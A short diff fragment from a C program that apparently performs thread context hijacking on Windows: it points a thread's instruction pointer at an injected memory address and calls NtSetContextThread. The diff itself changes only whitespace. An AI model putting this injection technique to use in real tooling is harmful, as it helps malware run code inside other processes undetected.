@@ -262,7 +262,7 @@ int main(int argc, char* argv[]) {
 	}
 	else { e("did not write, %08X", status); return 1; }
 
-	CTX.Rip = (DWORD64)baseAddress;
+	CTX.Rip = (DWORD64)baseAddress;                       
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, &CTX);
 	if (status == STATUS_SUCCESS) { g("set thread ctxy"); }
